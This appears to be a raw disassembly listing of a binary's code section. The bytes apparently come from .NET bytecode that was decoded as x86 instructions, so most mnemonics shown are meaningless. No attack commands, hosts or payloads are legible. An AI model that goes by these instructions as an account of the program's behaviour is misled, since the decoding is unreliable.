  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 18             	add    %dh,0x18(%edx)
  4042d8:	27                   	daa
  4042d9:	00 70 73             	add    %dh,0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 46             	add    %dh,0x46(%edx)
  40436b:	27                   	daa
  40436c:	00 70 73             	add    %dh,0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	9c                   	pushf
  404507:	27                   	daa
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 a2    	or     %dl,-0x5d8df9f3(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 b2    	or     %dl,-0x4d8df9f3(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
